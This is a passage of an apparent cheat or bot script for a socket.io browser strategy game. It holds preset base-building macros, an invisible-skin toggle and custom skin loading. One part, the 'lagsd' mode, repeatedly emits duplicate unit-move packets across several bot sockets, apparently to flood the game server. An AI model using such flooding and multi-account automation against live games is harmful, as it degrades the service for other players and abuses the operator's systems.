        1 == selUnits.length && (c = 0);
        if(lagsd==true){
 
        if (!window.sockets) return alert("no sockets");
        window.sockets.forEach(socket => {
 var trops = [];
    var a = player.x + targetDst * MathCOS(targetDir) + camX,
            d = player.y + targetDst * MathSIN(targetDir) + camY;
            for (var b = 0; b < selUnits.length; ++b) {trops.push(selUnits[b].id);}
 
   trops.forEach((unit) => {
    socket.emit("5", a, d, trops, 0, -1)
    socket.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d),trops,0,-1)
    socket.emit("5", a, d, trops, 0, -1)
    socket.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d), trops,0,1)
    socket.emit("5", a, d, trops, 0, -1)
    socket.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d),trops,0,-1)
    socket.emit("5", a, d, trops, 0, -1)
    socket.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d),trops,0,-1)
    socket.emit("5", a, d, trops, 0, -1)
    socket.emit("5", UTILS.roundToTwo(a), UTILS.roundToTwo(d),trops,0,-1)
   })
        })
movimentacao1()
}
if(lagsd==false){
 
   if(joinEnabled==true){
 var e = [];
    var a = player.x + targetDst * MathCOS(targetDir) + camX,
            d = player.y + targetDst * MathSIN(targetDir) + camY;
            for (var b = 0; b < selUnits.length; ++b) {e.push(selUnits[b].id);}
             socket.emit("5", a, d, e, 0, -1)
 
            if (!window.sockets) return alert("no sockets");
            window.sockets.forEach(socket => {
 
                 var receb = [];
        var a = player.x + targetDst * MathCOS(targetDir) + camX,
            d = player.y + targetDst * MathSIN(targetDir) + camY;
            for (var e = [], b = 0; b < selUnits.length; ++b) receb.push(selUnits[b].id);
            socket.emit("5",a,d, receb, 0, -1)
            })
   } if(joinEnabled==false){
    var e = [];
    var a = player.x + targetDst * MathCOS(targetDir) + camX,
            d = player.y + targetDst * MathSIN(targetDir) + camY;
            for (var b = 0; b < selUnits.length; ++b) {e.push(selUnits[b].id);}
             socket.emit("5", a, d, e, 1, 1)
 
            if (!window.sockets) return alert("no sockets");
            window.sockets.forEach(socket => {
 
                 var receb = [];
        var a = player.x + targetDst * MathCOS(targetDir) + camX,
            d = player.y + targetDst * MathSIN(targetDir) + camY;
            for (var e = [], b = 0; b < selUnits.length; ++b) receb.push(selUnits[b].id);
            socket.emit("5",a,d, receb, 1, 1)
            })
   }
        }
    }
}
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
//**************************************************************************************FIM**********************************************************************************
 
//RENDERIZA LINHA DOS CIRCULOS
        renderDottedCircle=function(a, d, c, b) {
            b.setLineDash([0, 0]); b.beginPath(); b.arc(a, d, c + b.lineWidth / 2, 0, 2 * Math.PI); b.stroke(); b.setLineDash([]) }
        renderDottedLine=function(a, d, c, b, g) {
            g.setLineDash([0, 0]); g.beginPath(); g.moveTo(a, d); g.lineTo(c, b); g.stroke(); g.setLineDash([]) }
//FIM DA SESSAO
 
 
/***********************************************************************************************************************************************************************/
 
 
 
//FUNÇÔES
 
 
 
//SKIN INVISIVEL
window.skin = function () {
   var abce = document.getElementById('skin');
   if (skins1) {
   skins1 = false;
   abce.innerHTML = 'Skin Invisivel: OFF';
   function httpGetAsync(theUrl, callback) {
   var xmlHttp = new XMLHttpRequest();
   xmlHttp.onreadystatechange = function() {
   if (xmlHttp.readyState == 4)
   callback(xmlHttp.status == 200 ? xmlHttp.responseText : false);
}
    xmlHttp.open("GET", theUrl, true);
    xmlHttp.send(null);
}
    var customSkins = [];
    httpGetAsync("https://andrewprivate.github.io/skins/skinlist", (b) => {
    if (b) {
    b = b.split('\n').filter((l) => {
    return l
});
    b.forEach((skin, i) => {
    customSkins.push(skin);
     })
   }
})
 
window.renderPlayer = function(a, d, c, b, g) {
    b.save();
    if (a.skin && 0 < a.skin && a.skin <= playerSkins && !skinSprites[a.skin]) {
        var e = new Image;
        e.onload = function() {
        this.readyToDraw = !0;
        this.onload = null;
        g == currentSkin && changeSkin(0)
};
        e.src = ".././img/skins/skin_" + (a.skin - 1) + ".png";
        skinSprites[a.skin] = e
 } else if (customSkins.length && a && a.name) {
     if (!a.resolvedSkin) {
        a.resolvedSkin = true;
     if (a.name[0] === ':') {
        var match = a.name.match(/(?:\:([0-9]*))(.*)/);
     if (match[1]) {
         a.name = match[2].length ? match[2] : "unknown";
         a.customSkin = parseInt(match[1]);
      }
   }
}
     if (a.customSkin !== undefined && customSkins[a.customSkin]) {
       var ind = a.customSkin + playerSkins + 1
     if (!skinSprites[ind]) {
       var e = new Image;
           e.onload = function() {
           this.readyToDraw = !0;
           this.onload = null;
}
           e.onerror = function() {
           this.onerror = null;
     if (skinSprites[ind] !== false) {
           setTimeout(function() {
           skinSprites[ind] = false;
      }, 1000)
   }
}
           e.src = "https://andrewprivate.github.io/skins/" + customSkins[a.customSkin] + ".png";
           skinSprites[ind] = e
}
      if (skinSprites[ind].readyToDraw) {
           e = a.size - b.lineWidth / 4
           b.save()
           b.lineWidth /= 2
           renderCircle(d, c, a.size, b, !1, !0)
           b.clip()
           b.drawImage(skinSprites[ind], d - e, c - e, 2 * e, 2 * e)
           b.restore();
           return;
    }
  }
}
    a.skin && skinSprites[a.skin] && skinSprites[a.skin].readyToDraw ? (e = a.size - b.lineWidth / 4, b.drawImage(skinSprites[a.skin], d - e, c - e, 2 * e, 2 * e), b.lineWidth /= 2, renderCircle(d, c, a.size, b, !1, !0)) : g || (b.fillStyle = playerColors[a.color], renderCircle(d,
    c, a.size, b));
    b.restore()
}
   } else {
   skins1 = true;
   abce.innerHTML = 'Skin Invisivel: ON';;
   window.renderPlayer = function(a, d, c, b, g) {
   b.save();
   if (a.skin && 0 < a.skin && a.skin <= playerSkins && !skinSprites[a.skin]) {
   var e = new Image;
   e.onload = function() {
   this.readyToDraw = !0;
   this.onload = null;
   g == currentSkin && changeSkin(0);
};
   e.src = ".././img/skins/skin_" + (a.skin - 1) + ".png";
   skinSprites[a.skin] = e;
}
  a.skin && skinSprites[a.skin] && skinSprites[a.skin].readyToDraw ? (e = a.size - b.lineWidth / 4, b.lineWidth /= 2, renderCircle(d, c, a.size, b, !1, !0)) : g || (b.fillStyle = "rgba(255, 255, 255, 0)", renderCircle(d, c, a.size, b));
  b.restore();
}
};
  window.statusBar();
  return skins1;
}
 
 
 
/*
    socket.emit("1",-3.106356597799549,305.9999419934585,8)
                  socket.emit("1",1.5707963267948966,245, 4)
                  socket.emit("1",1.8199775163071004,245.8532580626094, 4)
                  socket.emit("1",1.3200169099085362,245.85037258462714, 4)
                  socket.emit("1",1.3300154002057945,130.00024038439312, 4)
                  socket.emit("1",1.8299915109961415,130.0025307445975, 4)
                  socket.emit("1",0.8599841016679016,130.002395362547, 4)
                  socket.emit("1",1.4099926087589418,188.8057991694111, 4)
                  socket.emit("1",1.7349846916173248,188.31255082973092, 4)
                  socket.emit("1",1.7349846916173248,188.31255082973092, 4)
                  socket.emit("1",1.0799941069875996,181.0182999036286, 4)
                  socket.emit("1",0.7399903297671494,187.0882361347181, 4)
                  socket.emit("1",1.0699952967746982,245.8509247491251, 4)
                  socket.emit("1",0.8200060340641879,245.8456037841637, 4)
*/
//BASES ARRAY
window.basesat = window.basesat || [];
window.basesat.b1 =function(){
   baati=1;
    socket.emit('1', -1.5700106126708684, 140.00004321427903, 7)
socket.emit('1', -1.7000148606496814, 245.84967439474067, 4)
socket.emit('1', -1.4499829977704481, 245.85202968452387, 4)
socket.emit('1', -1.9600117322878918, 245.84766767248374, 4)
socket.emit('1', -1.190010480831702, 245.84949562689772, 4)
socket.emit('1', -0.940002399538321, 245.8518488846484, 4)
socket.emit('1', -2.2099939200721685, 245.84627656322152, 4)
socket.emit('1', -2.460010073947715, 245.8482428247149, 4)
socket.emit('1', -0.68999379195146, 245.84766055425465, 4)
socket.emit('1', -2.7100200884884718, 245.8524388734023, 4)
socket.emit('1', -0.44001577785110063, 245.84829326232875, 4)
socket.emit('1', -2.9600001579841555, 245.8524681592601, 4)
socket.emit('1', -0.18999289668797456, 245.85400098432402, 4)
socket.emit('1', 3.0699837980692224, 245.85006914784466, 4)
socket.emit('1', 0.059990681918325205, 245.85226397167872, 4)
socket.emit('1', 2.819996447968711, 245.85444189601293, 4)
socket.emit('1', 0.3100066674634234, 245.84925645606495, 4)
socket.emit('1', 2.5699936738769917, 245.851241404228, 4)
socket.emit('1', 0.5700079761262185, 245.8496477524424, 4)
socket.emit('1', 2.3200046913513606, 245.85230118914893, 4)
socket.emit('1', 0.820006034064188, 245.84560378416367, 4)
socket.emit('1', 1.0699952967746982, 245.85092474912517, 4)
socket.emit('1', 2.06997749039974, 245.8498700426746, 4)
socket.emit('1', 1.3200169099085362, 245.85037258462717, 4)
socket.emit('1', 1.8199775163071, 245.85325806260937, 4)
socket.emit('1', 1.5707963267948966, 245, 4)
socket.emit('1', -1.9099778164562562, 184.69242377531353, 4)
socket.emit('1', -1.2300086213878563, 184.39420001724565, 4)
socket.emit('1', -2.249989239639131, 185.5721881101799, 4)
socket.emit('1', -0.8899748919895981, 184.92877007107356, 4)
socket.emit('1', -2.580028650228454, 190.2121555001152, 4)
socket.emit('1', -0.5600096258476681, 190.15638879616958, 4)
socket.emit('1', -2.900017149289083, 186.72198290506665, 4)
socket.emit('1', -0.24001735016804046, 185.76517219328278, 4)
socket.emit('1', 3.0499833901970574, 183.09776459585737, 4)
socket.emit('1', 0.0899806999675948, 183.95419266763125, 4)
socket.emit('1', 0.42002170539795725, 189.80810335704848, 4)
socket.emit('1', 2.720019256458977, 189.7865234941617, 4)
socket.emit('1', 0.7399903297671494, 187.08823613471802, 4)
socket.emit('1', 2.399988472371375, 188.00196009616494, 4)
socket.emit('1', 2.0700063587483317, 180.99892430619582, 4)
socket.emit('1', 1.0799941069875991, 181.01829990362853, 4)
socket.emit('1', 1.7349846916173248, 188.31255082973095, 4)
socket.emit('1', 1.4099926087589418, 188.8057991694111, 4)
socket.emit('1', -2.095027983901983, 129.99752497643945, 4)
socket.emit('1', -1.0480151486066502, 130.00414493392122, 4)
socket.emit('1', -2.5650045922550753, 129.99691265564732, 4)
socket.emit('1', -0.5799805865981332, 129.99817383332734, 4)
socket.emit('1', -3.0350044908896803, 129.99775574985898, 4)
socket.emit('1', -0.08997040024659213, 129.99578185464327, 4)
socket.emit('1', 0.3799921575573514, 130.00346649224397, 4)
socket.emit('1', 2.7799859160506277, 129.99695457971313, 4)
socket.emit('1', 2.3000322148292915, 130.00149229912708, 4)
socket.emit('1', 0.8599841016679013, 130.00239536254705, 4)
socket.emit('1', 1.8299915109961422, 130.00253074459744, 4)
socket.emit('1', 1.3300154002057945, 130.00024038439312, 4)
socket.emit('1', 2.999992125059829, 310.0026975689082, 8)
socket.emit('1', 0.14000385187528794, 310.00323949920266, 8)
socket.emit('1', 2.1800133190918873, 310.00016935479243, 8)
socket.emit('1', 0.9600042952762952, 309.9998170967202, 8)
socket.emit('1', -2.6699945529662017, 306.00215750873394, 1)
socket.emit('1', 2.7900128568563245, 305.99794574473856, 1)
socket.emit('1', -2.470016015501195, 306.00059231968817, 1)
socket.emit('1', 2.589997616168583, 306.00345422886977, 1)
socket.emit('1', 0.7499893657347605, 306.00135032381803, 1)
socket.emit('1', -2.2699866427014794, 305.99837189109354, 1)
socket.emit('1', -2.0699943864344963, 306.00247662396464, 1)
socket.emit('1', -1.8700160655604219, 305.9964052076429, 1)
socket.emit('1', 0.5499978909804834, 305.99666746551344, 1)
socket.emit('1', -1.67000974065864, 306.00481385102427, 1)
socket.emit('1', 1.5700120132302293, 306.00009411763256, 1)
socket.emit('1', 1.370003953798924, 305.99784868524813, 1)
socket.emit('1', 1.1699896183257419, 306.00169051820615, 1)
socket.emit('1', 1.7699864114120454, 306.00049836560726, 1)
socket.emit('1', 1.9700067461273423, 306.0014496697687, 1)
socket.emit('1', 2.389985091767417, 305.99836143352144, 1)
socket.emit('1', 0.3500078561529569, 306.0029532537227, 1)
socket.emit('1', -3.069996478996158, 306.00395503980013, 1)
socket.emit('1', -0.2700039626868069, 305.9962949122097, 1)
socket.emit('1', -0.06999195179529029, 305.9992197702471, 1)
socket.emit('1', -0.46999051303302714, 305.99864182705124, 1)
socket.emit('1', -0.6699944573743297, 305.999383822909, 1)
socket.emit('1', -0.8699825064937459, 305.9984261397434, 1)
socket.emit('1', -1.069989043941217, 305.99801110464756, 1)
socket.emit('1', -1.4700058293549059, 306.0029846259673, 1)
socket.emit('1', -1.2700052430104107, 305.99859999679734, 1)
socket.emit('1', -2.8699950543696477, 305.99675896976424, 1)
}
 
window.basesat.b2=function(){
    baati=2;
        socket.emit("1",-1.5700106126708684, 140.00004321427903, 7)
socket.emit("1", -1.06, 310, 8),socket.emit("1", -2.08, 310, 8),socket.emit("1", -0.64, 310, 8),socket.emit("1", -2.5, 310, 8),socket.emit("1", -1.87, 306, 1),socket.emit("1", -1.27, 306, 1),socket.emit("1", -1.67, 306, 1),socket.emit("1", -1.47, 306, 1),socket.emit("1", -2.29, 306, 1),socket.emit("1", -0.85, 306, 1),socket.emit("1", -0.43, 306, 1),socket.emit("1", -2.71, 306, 1),socket.emit("1", -2.91, 306, 1),socket.emit("1", -0.23, 306, 1),socket.emit("1", -0.03, 306, 1),socket.emit("1", -3.11, 306, 1),socket.emit("1", 2.97, 306, 1),socket.emit("1", 0.17, 306, 1),socket.emit("1", 2.77, 306, 1),socket.emit("1", 0.37, 306, 1),socket.emit("1", 0.57, 306, 1),socket.emit("1", 2.57, 306, 1),socket.emit("1", 2.37, 306, 1),socket.emit("1", 0.77, 306, 1),socket.emit("1", 0.97, 306, 1),socket.emit("1", 2.17, 306, 1),socket.emit("1", 1.97, 306, 1),socket.emit("1", 1.17, 306, 1),socket.emit("1", 1.37, 306, 1),socket.emit("1", 1.77, 306, 1),socket.emit("1",Math.PI*-1.5,306,1),socket.emit("1", -1.7, 245.85, 4),socket.emit("1", -1.45, 245.85, 4),socket.emit("1", -1.96, 245.85, 4),socket.emit("1", -1.19, 245.85, 4),socket.emit("1", -0.94, 245.85, 4),socket.emit("1", -2.21, 245.85, 4),socket.emit("1", -2.46, 245.85, 4),socket.emit("1", -0.69, 245.85, 4),socket.emit("1", -2.71, 245.85, 4),socket.emit("1", -0.44, 245.85, 4),socket.emit("1", -2.96, 245.85, 4),socket.emit("1", -0.19, 245.85, 4),socket.emit("1", 3.07, 245.85, 4),socket.emit("1", 0.06, 245.85, 4),socket.emit("1", 2.82, 245.85, 4),socket.emit("1", 0.31, 245.85, 4),socket.emit("1", 2.57, 245.85, 4),socket.emit("1", 0.57, 245.85, 4),socket.emit("1", 2.32, 245.85, 4),socket.emit("1", 0.82, 245.85, 4),socket.emit("1", 1.07, 245.85, 4),socket.emit("1", 2.07, 245.85, 4),socket.emit("1", 1.32, 245.85, 4),socket.emit("1", 1.82, 245.85, 4),socket.emit("1",Math.PI*-1.5,245,4),socket.emit("1", -1.91, 184.69, 4),socket.emit("1", -1.23, 184.4, 4),socket.emit("1", -2.25, 185.57, 4),socket.emit("1", -0.89, 184.93, 4),socket.emit("1", -2.58, 190.21, 4),socket.emit("1", -0.56, 190.16, 4),socket.emit("1", -2.9, 186.72, 4),socket.emit("1", -0.24, 185.76, 4),socket.emit("1", 3.05, 183.1, 4),socket.emit("1", 0.09, 183.95, 4),socket.emit("1", 0.42, 189.81, 4),socket.emit("1", 2.72, 189.79, 4),socket.emit("1", 0.74, 187.09, 4),socket.emit("1", 2.4, 188, 4),socket.emit("1", 2.07, 181, 4),socket.emit("1", 1.08, 181.02, 4),socket.emit("1", 1.735, 188.31, 4),socket.emit("1", 1.41, 188.81, 4),socket.emit("1", -2.095, 130, 4),socket.emit("1", -1.048, 130, 4),socket.emit("1", -2.565, 130, 4),socket.emit("1", -0.58, 130, 4),socket.emit("1", -3.035, 130, 4),socket.emit("1", -0.09, 130, 4),socket.emit("1", 0.38, 130, 4),socket.emit("1", 2.78, 130, 4),socket.emit("1", 2.3, 130, 4),socket.emit("1", 0.86, 130, 4),socket.emit("1", 1.83, 130, 4),socket.emit("1", 1.33, 130, 4);
}
 
window.basesat.b3=function(){
    baati=3;
   socket.emit("1", 2.205, 189.5, 4);
        socket.emit("1", 2.88, 245, 4);
        socket.emit("1", 6.486, 185, 3);
        socket.emit("1", 2.5425, 184, 5);
        socket.emit("1", 5.725, 130, 3);
        socket.emit("1", 9.975, 130, 3);
        socket.emit("1", 6.875, 184, 5);
        socket.emit("1", 4.375, 186, 3);
        socket.emit("1", 5.065, 187, 3);
        socket.emit("1", 6, 245, 3);
        socket.emit("1", 6.295, 245, 3);
        socket.emit("1", 7.07, 245, 3);
        socket.emit("1", 7.358, 245, 3);
        socket.emit("1", 2.05, 245, 3);
        socket.emit("1", 2.375, 245, 3);
        socket.emit("1", 3.1375, 245, 3);
        socket.emit("1", 3.445, 245, 3);
        socket.emit("1", 4.725, 130, 7);
        socket.emit("1", 6.205, 130, 4);
        socket.emit("1", 6.675, 130, 4);
        socket.emit("1", 7.145, 130, 4);
        socket.emit("1", 7.615, 130, 4);
        socket.emit("1", 8.085, 130, 4);
        socket.emit("1", 8.555, 130, 4);
        socket.emit("1", 9.025, 130, 4);
        socket.emit("1", 9.495, 130, 4);
        socket.emit("1", 10.475, 130, 4);
        socket.emit("1", 5.245, 130, 4);
        socket.emit("1", 4.72, 210, 1);
        socket.emit("1", 5.475, 183, 5);
        socket.emit("1", 5.825, 193, 4);
        socket.emit("1", 6.15, 190, 4);
        socket.emit("1", 7.215, 190, 4);
        socket.emit("1", 7.535, 190, 4);
        socket.emit("1", 1.565, 200, 4);
        socket.emit("1", 1.88, 189, 4);
        socket.emit("1", 2.95, 184, 3);
        socket.emit("1", 3.283, 190, 4);
        socket.emit("1", 3.61, 193, 4);
        socket.emit("1", 3.95, 183, 5);
        socket.emit("1", 5.687, 245, 1);
        socket.emit("1", 6.56, 245, 4);
        socket.emit("1", 3.75, 245, 1);
        socket.emit("1", 4.94, 245, 4);
        socket.emit("1", 5.1875, 245, 4);
        socket.emit("1", 5.435, 245, 4);
        socket.emit("1", 6.81, 245, 1);
        socket.emit("1", 7.65, 245, 4);
        socket.emit("1", 1.75, 245, 4);
        socket.emit("1", 2.6325, 245, 1);
        socket.emit("1", 4, 245, 4);
        socket.emit("1", 4.25, 245, 4);
        socket.emit("1", 4.5, 245, 4);
        socket.emit("1", 4.72, 311, 1);
        socket.emit("1", 4.92, 311, 1);
        socket.emit("1", 5.12, 311, 1);
        socket.emit("1", 5.32, 311, 1);
        socket.emit("1", 5.52, 311, 1);
        socket.emit("1", 5.94, 311, 1);
        socket.emit("1", 6.14, 311, 1);
        socket.emit("1", 6.34, 311, 1);
        socket.emit("1", 6.54, 311, 1);
        socket.emit("1", 6.96, 311, 1);
        socket.emit("1", 7.16, 311, 1);
        socket.emit("1", 7.36, 311, 1);
        socket.emit("1", 7.56, 311, 1);
        socket.emit("1", 7.76, 311, 1);
        socket.emit("1", 7.96, 311, 1);
        socket.emit("1", 8.16, 311, 1);
        socket.emit("1", 8.36, 311, 1);
        socket.emit("1", 8.56, 311, 1);
        socket.emit("1", 8.76, 311, 1);
        socket.emit("1", 9.18, 311, 1);
        socket.emit("1", 9.38, 311, 1);
        socket.emit("1", 9.58, 311, 1);
        socket.emit("1", 9.78, 311, 1);
        socket.emit("1", 10.2, 311, 1);
        socket.emit("1", 10.4, 311, 1);
        socket.emit("1", 10.6, 311, 1);
        socket.emit("1", 10.8, 311, 1);
        socket.emit("1", 5.73, 311, 8);
        socket.emit("1", 6.75, 311, 8);
        socket.emit("1", 8.97, 311, 8);
        socket.emit("1", 9.99, 311, 8);}
 
window.basesat.b4=function(){
    baati=4;
  socket.emit("1",-1.029981069065158,130.00279766220393,4); socket.emit("1",-1.5581532402252236,140.0011892806627,7); socket.emit("1",-2.0799718731183336,130.00106538025,4); socket.emit("1",-2.22001282329931,186.51504630994276,4); socket.emit("1",-0.5599855192715101,129.99508490708408,4); socket.emit("1",-2.5400062659482847,190.29913846363024,4); socket.emit("1",-2.5500059124657732,130.0031465003827,4); socket.emit("1",-2.859996061699241,187.4844526887495,4); socket.emit("1",0.5100119705827428,189.02565778221742,4); socket.emit("1",0.3999627324295431,130.0001999998459,4); socket.emit("1",2.7600149554480073,129.99980999986118,4); socket.emit("1",2.3300064486886476,189.56961834640066,4); socket.emit("1",2.280023344776488,129.99668495773264,4); socket.emit("1",1.8100189720265183,132.3078006014762,4); socket.emit("1",1.5800271739950331,180.917707812143,4); socket.emit("1",1.350029718682639,131.33758068428105,4); socket.emit("1",0.8300027953539185,190.61344443663967,4); socket.emit("1",0.8800172557935131,130.00326495899998,4); socket.emit("1",2.6500197356626956,191.88025041676377,4); socket.emit("1",2.7800083883328384,245.84707319795345,4); socket.emit("1",0.4000101287536772,245.84796358725444,4); socket.emit("1",-1.8900261929989046,185.67056040201953,4); socket.emit("1",-1.7800061609210787,245.85069391807681,4); socket.emit("1",0.16997778317304116,183.4944252559188,3); socket.emit("1",-2.3399840834473435,243.84952757797168,3); socket.emit("1",-3.0399791675425565,132.0008882545873,3); socket.emit("1",-2.0399825212769445,243.85142525726613,3); socket.emit("1",2.9799924558729827,182.53827680790664,3); socket.emit("1",-0.08000820113957931,132.00226854111253,3); socket.emit("1",-0.11000057487462135,243.85384413619576,3); socket.emit("1",-2.9900158813652826,243.84588350021434,3); socket.emit("1",1.9900202670034008,187.9122393565675,3); socket.emit("1",1.8400156195617396,243.85389990730124,3); socket.emit("1",1.2999943584973332,243.84657984068593,3); socket.emit("1",1.1600326380389694,186.7222796026227,3); socket.emit("1",1.5700171594315573,243.85007402090318,5); socket.emit("1",-2.6899763044002447,243.84744493227737,5); socket.emit("1",0.6600037242670697,243.85120401589165,5); socket.emit("1",2.479981208977897,243.85198871446607,5); socket.emit("1",-1.5499875782200248,212.42598899381412,5); socket.emit("1",-1.2199992447927401,185.5395246301983,4); socket.emit("1",-0.8899891427417109,188.9674818586522,4);
socket.emit("1",-0.5700269467765231,191.64104988232575,4); socket.emit("1",-0.24999497873866444,189.04677146145613,4); socket.emit("1",-1.320016909908535,245.85037258462708,4); socket.emit("1",-0.750013681451305,243.84992269836783,3); socket.emit("1",-1.059997425435585,243.84589908382696,3); socket.emit("1",-0.40999653010618003,243.84972749625928,5); socket.emit("1",3.0299921466464235,245.84939861630755,1); socket.emit("1",0.1500021711564089,245.85071832313213,1); socket.emit("1",-2.8699950543696473,305.99675896976447,1); socket.emit("1",-2.6699945529662017,306.00215750873383,1); socket.emit("1",2.7900128568563245,305.99794574473884,1); socket.emit("1",-2.470016015501195,306.00059231968834,1); socket.emit("1",2.5899976161685827,306.00345422886977,1); socket.emit("1",0.74998936573476,306.00135032381803,1); socket.emit("1",-2.26998664270148,305.9983718910935,1); socket.emit("1",-2.0699943864344963,306.00247662396436,1); socket.emit("1",-1.870016065560421,305.99640520764297,1); socket.emit("1",0.5499978909804838,305.9966674655133,1); socket.emit("1",-1.6700097406586398,306.00481385102427,1); socket.emit("1",1.57001201323023,306.00009411763256,1); socket.emit("1",1.370003953798923,305.9978486852481,1); socket.emit("1",1.169989618325742,306.0016905182061,1); socket.emit("1",1.769986411412046,306.0004983656071,1); socket.emit("1",1.9700067461273425,306.00144966976876,1); socket.emit("1",2.1799902314087785,244.3697955967552,1); socket.emit("1",0.9600037510265641,245.97356544962315,1); socket.emit("1",2.3899850917674166,305.9983614335214,1); socket.emit("1",0.3500078561529565,306.00295325372247,1); socket.emit("1",-3.0699964789961585,306.0039550397999,1); socket.emit("1",-0.27000396268680665,305.9962949122095,1); socket.emit("1",-0.0699919517952906,305.9992197702471,1); socket.emit("1",-0.4699905130330266,305.99864182705136,1); socket.emit("1",-0.6699944573743298,305.99938382290895,1); socket.emit("1",-0.8699825064937456,305.9984261397436,1); socket.emit("1",-1.069989043941217,305.9980111046476,1); socket.emit("1",-1.4700058293549059,306.00298462596714,1); socket.emit("1",-1.2700052430104114,305.9985999967975,1); socket.emit("1",2.999992125059829,310.00269756890833,8); socket.emit("1",0.14000385187528874,310.0032394992025,8); socket.emit("1",2.180013319091887,310.0001693547924,8); socket.emit("1",0.9600042952762949,309.99981709672005,8);
}
 
    window.basesat.b21=function(){
        baati=21;
   socket.emit("1",-1.5581532402252234, 140.0011892806629,7),socket.emit("1",-1.9299812342490636 ,186.48050541544552,4),socket.emit("1",-2.089961523372133 , 129.99956499927222 ,4),socket.emit("1",-2.2999847216876628 , 183.63574298049932 , 5),socket.emit("1",2.980006006787999, 305.99613232849856, 1);socket.emit("1",4.725,130,7); socket.emit("1",3.985,183,5); socket.emit("1",5.475,183,5); socket.emit("1",6.47,184,5); socket.emit("1",7.85,186,5); socket.emit("1",9.26,183,5); socket.emit("1",5.245,130,4); socket.emit("1",5.725,130,4); socket.emit("1",6.205,130,4); socket.emit("1",6.675,130,4); socket.emit("1",7.145,130,4); socket.emit("1",7.615,130,4); socket.emit("1",8.085,130,4); socket.emit("1",8.555,130,4); socket.emit("1",9.025,130,4); socket.emit("1",3.225,130,4); socket.emit("1",9.975,130,4); socket.emit("1",10.485,130,4); socket.emit("1",4.72,210,4); socket.emit("1",5.06,185,4); socket.emit("1",5.81,189,4); socket.emit("1",6.13,190,4); socket.emit("1",6.81,187,4); socket.emit("1",7.13,191,4); socket.emit("1",7.45,185,4); socket.emit("1",8.25,185,4); socket.emit("1",8.6,190,4); socket.emit("1",8.92,189,4); socket.emit("1",9.6,189,4); socket.emit("1",9.925,190,4); socket.emit("1",4.39,185,4); socket.emit("1",4.94,246,4); socket.emit("1",5.1875,246,4); socket.emit("1",5.435,246,4); socket.emit("1",5.685,246,4); socket.emit("1",5.935,246,4); socket.emit("1",6.24,246,4); socket.emit("1",6.49,246,4); socket.emit("1",6.74,246,4); socket.emit("1",6.99,246,4); socket.emit("1",7.25,246,4); socket.emit("1",7.5,246,4); socket.emit("1",7.75,246,4); socket.emit("1",8,246,4); socket.emit("1",8.25,246,4); socket.emit("1",8.5,246,4); socket.emit("1",8.75,246,4); socket.emit("1",9.01,246,4); socket.emit("1",9.26,246,4); socket.emit("1",9.51,246,4); socket.emit("1",9.76,246,4); socket.emit("1",10.03,246,4); socket.emit("1",4,246,4); socket.emit("1",4.25,246,4); socket.emit("1",4.5,246,4); socket.emit("1",7.86,311,1); socket.emit("1",8.06,311,1); socket.emit("1",8.26,311,1); socket.emit("1",8.46,311,1); socket.emit("1",8.66,311,1); socket.emit("1",8.86,311,1); socket.emit("1",9.06,311,1); socket.emit("1",9.26,311,1); socket.emit("1",9.46,311,1); socket.emit("1",9.66,311,1); socket.emit("1",9.86,311,1); socket.emit("1",10.28,311,1); socket.emit("1",10.70,311,1); socket.emit("1",10.90,311,1); socket.emit("1",11.10,311,1); socket.emit("1",11.30,311,1); socket.emit("1",11.72,311,1); socket.emit("1",12.14,311,1); socket.emit("1",12.34,311,1); socket.emit("1",12.54,311,1); socket.emit("1",12.74,311,1); socket.emit("1",12.94,311,1); socket.emit("1",13.14,311,1); socket.emit("1",13.34,311,1); socket.emit("1",13.54,311,1); socket.emit("1",13.74,311,1); socket.emit("1",13.94,311,1); socket.emit("1",10.07,311,8); socket.emit("1",10.49,311,8); socket.emit("1",11.51,311,8); socket.emit("1",11.93,311,8);
    }
   window.basesat.b5=function(){
            baati=5;
 
 
     socket.emit("1",4.73,245,3);
                socket.emit("1",5.0025,245,3);
                socket.emit("1",5.5475,245,3);
                socket.emit("1",5.82,245,3);
socket.emit("1",6.0925,245,3);
                socket.emit("1",6.6375,245,3);
                socket.emit("1",6.91,245,3);
                socket.emit("1",7.1825,245,3);
                socket.emit("1",7.7275,245,3);
                socket.emit("1",8.0025,245,3);
                socket.emit("1",8.5475,245,3);
                socket.emit("1",8.82,245,3);
                socket.emit("1",9.0925,245,3);
                socket.emit("1",9.64,245,3);
                socket.emit("1",9.9125,245,3);
                socket.emit("1",10.1875,245,3);
                socket.emit("1",10.7375,245,3);
                socket.emit("1",10.53,130,1);
                socket.emit("1",10.05,130,1);
                socket.emit("1",9.57,130,1);
                socket.emit("1",9.09,130,1);
                socket.emit("1",8.61,130,1);
                socket.emit("1",8.13,130,1);
                socket.emit("1",7.65,130,1);
                socket.emit("1",7.17,130,1);
                socket.emit("1",6.68,130,1);
                socket.emit("1",6.19,130,1);
                socket.emit("1",5.70,130,1);
                socket.emit("1",5.21,130,1);
                socket.emit("1",4.72,130,1);
                socket.emit("1",10.78,180,1);
                socket.emit("1",10.3,180,1);
                socket.emit("1",9.8,180,1);
                socket.emit("1",9.32,180,1);
                socket.emit("1",8.85,180,1);
                socket.emit("1",8.38,180,1);
                socket.emit("1",7.88,180,1);
                socket.emit("1",7.4,180,1);
                socket.emit("1",6.95,180,1);
                socket.emit("1",6.45,180,1);
                socket.emit("1",5.95,180,1);
                socket.emit("1",5.47,180,1);
                socket.emit("1",4.95,180,1);
                socket.emit("1",5.275,245,5);
socket.emit("1",6.365,245,5);
                socket.emit("1",7.455,245,5);
                socket.emit("1",8.275,245,5);
                socket.emit("1",9.3675,245,5);
                socket.emit("1",10.4625,245,5);
                socket.emit("1",1.72,311,1);
                socket.emit("1",1.97,311,1);
                socket.emit("1",2.22,311,1);
                socket.emit("1",2.47,311,1);
                socket.emit("1",2.72,311,1);
                socket.emit("1",2.97,311,1);
                socket.emit("1",3.22,311,1);
                socket.emit("1",3.47,311,1);
                socket.emit("1",3.72,311,1);
                socket.emit("1",3.97,311,1);
                socket.emit("1",4.22,311,1);
                socket.emit("1",4.47,311,1);
                socket.emit("1",4.72,311,1);
                socket.emit("1",4.97,311,1);
                socket.emit("1",5.22,311,1);
                socket.emit("1",5.47,311,1);
                socket.emit("1",5.72,311,1);
                socket.emit("1",5.97,311,1);
                socket.emit("1",6.22,311,1);
                socket.emit("1",6.47,311,1);
